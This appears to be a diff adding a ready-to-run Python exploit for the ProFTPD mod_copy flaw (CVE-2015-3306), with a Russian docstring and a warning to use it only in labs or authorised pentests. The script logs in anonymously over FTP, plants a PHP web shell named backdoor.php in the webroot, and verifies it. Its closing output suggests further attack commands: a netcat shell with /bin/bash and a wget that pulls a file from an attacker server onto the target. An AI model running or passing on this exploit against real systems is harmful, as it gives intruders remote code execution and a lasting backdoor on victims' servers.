@@ -1,0 +1,122 @@
+#!/usr/bin/env python3
+"""
+=============================================================================
+ created_file.py — эксплойт ProFTPD mod_copy (CVE-2015-3306) → PHP-вебшелл
+=============================================================================
+
+ЗАЧЕМ:
+    Демонстрирует получение RCE через уязвимость mod_copy в ProFTPD
+    (CVE-2015-3306): команды SITE CPFR/CPTO позволяют копировать файлы БЕЗ
+    аутентификации. Скрипт через анонимный FTP записывает в webroot файл
+    backdoor.php с содержимым  <?php system($_GET["cmd"]); ?>  и проверяет
+    его исполнение HTTP-запросом (?cmd=echo 'SUCCESS').
+
+    Техника: CPFR берёт исходный «файл», где строкой оказывается PHP-код,
+    и CPTO пишет его в /var/www/html/backdoor.php (через /proc/self/fd).
+
+ГДЕ ПРИМЕНИМО:
+    Цель с уязвимым ProFTPD (mod_copy включён), известным webroot и доступом
+    к порту 21. Подтверждение критического RCE в отчёте о пентесте.
+
+ЗАПУСК:
+    python3 created_file.py <IP-адрес>
+
+⚠ ВНИМАНИЕ (правовое/операционное):
+    Скрипт СОЗДАЁТ веб-шелл (backdoor) на цели — это активное вмешательство.
+    Запускать ТОЛЬКО на собственных стендах или в рамках письменно
+    согласованного пентеста. После проверки — обязательно удалить backdoor.php.
+    Путь webroot и способ записи зашиты под типовой стенд — правьте под цель.
+=============================================================================
+"""
+import sys
+import socket
+import requests
+
+def create_backdoor(target_ip):
+    """Создает backdoor.php на целевом сервере"""
+    try:
+        # Подключаемся к FTP-серверу
+        ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        ftp.connect((target_ip, 21))
+        banner = ftp.recv(1024).decode()
+        print(f"[*] FTP Banner: {banner.strip()}")
+
+        # Анонимная аутентификация
+        ftp.send(b'USER anonymous\r\n')
+        ftp.recv(1024)
+        ftp.send(b'PASS backdoor@example.com\r\n')
+        auth_response = ftp.recv(1024).decode()
+        
+        if "230" not in auth_response:
+            print("[!] Ошибка анонимной аутентификации")
+            return False
+        print("[+] Успешная аутентификация")
+
+        # Шаги создания бэкдора
+        steps = [
+            b'SITE CPFR /etc/passwd\r\n',  # Инициируем копирование
+            b'SITE CPTO <?php system($_GET["cmd"]); ?>\r\n',  # Пишем PHP-код
+            b'SITE CPFR /proc/self/fd/3\r\n',  # Читаем из файлового дескриптора
+            b'SITE CPTO /var/www/html/backdoor.php\r\n'  # Создаем бэкдор
+        ]
+        
+        responses = []
+        for cmd in steps:
+            ftp.send(cmd)
+            response = ftp.recv(1024).decode()
+            responses.append(response.strip())
+            print(f"[>] {cmd.decode().strip()}")
+            print(f"[<] {response.strip()}")
+            
+        ftp.close()
+        
+        # Проверяем успешность создания
+        if "250 Copy successful" in responses[-1]:
+            print("\n[+] Бэкдор успешно создан!")
+            return True
+            
+        print("\n[!] Ошибка создания бэкдора")
+        return False
+        
+    except Exception as e:
+        print(f"[!] Ошибка: {str(e)}")
+        return False
+
+def verify_backdoor(target_ip):
+    """Проверяем доступность бэкдора"""
+    url = f"http://{target_ip}/backdoor.php?cmd=echo%20'SUCCESS'"
+    try:
+        response = requests.get(url, timeout=5)
+        if "SUCCESS" in response.text:
+            print(f"[+] Бэкдор работает: {url}")
+            return True
+            
+        print("[!] Бэкдор не отвечает")
+        return False
+        
+    except:
+        print("[!] Не удалось подключиться к бэкдору")
+        return False
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Использование: {sys.argv[0]} <IP-адрес>")
+        print(f"Пример: {sys.argv[0]} 172.23.107.147")
+        sys.exit(1)
+        
+    target = sys.argv[1]
+    
+    print(f"[*] Создаем бэкдор на сервере {target}")
+    if create_backdoor(target):
+        print("[*] Проверяем работоспособность...")
+        verify_backdoor(target)
+        
+        print("\n[+] Использование:")
+        print(f"  Выполнить команду: curl '{target}/backdoor.php?cmd=id'")
+        print(f"  Интерактивная оболочка: nc {target} 80 -e /bin/bash")
+        print(f"  Загрузить файл: wget http://{target}/backdoor.php?cmd=wget+http://ваш-сервер/backdoor")
+    else:
+        print("[-] Не удалось создать бэкдор. Сервер может быть не уязвим")
+
+if __name__ == "__main__":
+    main()
